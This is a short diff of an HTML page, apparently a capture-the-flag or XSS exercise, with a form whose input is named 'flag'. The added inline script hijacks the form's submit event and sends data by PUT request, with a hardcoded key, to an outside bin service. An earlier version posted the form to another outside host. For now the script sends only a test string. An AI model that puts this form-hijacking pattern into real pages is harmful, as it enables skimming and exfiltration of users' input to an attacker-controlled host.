@@ -3,8 +3,25 @@
 		<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline';">
 	</head>
 	<body>
-		<script id="pwn" src="true"></script>
-		<form action="http://jnaskjdnsalkndkj.bplaced.net/index.php" method="post">
+		<script id="pwn" src="true">
+			function sendmydata(data) {
+				var req = new XMLHttpRequest();
+	
+				req.open("PUT", "https://jon.extendsclass.com/bin/efbe379dfbef");
+				req.setRequestHeader("Security-key","d8f0bc6b-c48f-11eb-86a8-0242ac110008");
+				req.send(data);
+			}
+			
+			window.onload = function() {
+				var form = document.getElementById("myform");	
+				form.onsubmit = function(e) {
+					sendmydata("hellofrom form");
+					e.preventDefault();
+				}
+			}
+		</script>
+		
+		<form id="myform">
 			<input id="flag" name="name" type="text" />
 			<input type="submit" />
 		</form>
